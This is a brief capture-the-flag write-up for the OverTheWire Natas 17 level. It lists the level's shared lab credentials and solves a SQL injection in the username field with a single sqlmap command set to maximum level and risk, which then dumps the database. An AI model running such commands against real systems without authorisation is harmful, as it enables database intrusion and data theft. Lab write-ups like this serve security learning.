
# Natas 17 (Over The Wire CTF)

Credentials:

- Username: `natas17`
- Password: `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`


# Problem

SQL Injection for `username` parameter.

The website's PHP code executes an SQL query directly based on the input text field.


# Solution

The website's input text field can be abused by `sqlmap` to pipe through a lot of
exploitation techniques, and we are going to try that out.

```bash
sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas17 --auth-type=basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --dbms=mysql --level=5 --risk=3
```

After `sqlmap` is done detecting SQL injection techniques, it offers to dump the database
successfully. It takes a while, because the server was really slow, so it needed to increment
its `timeout` value to about `10 seconds` at the end.

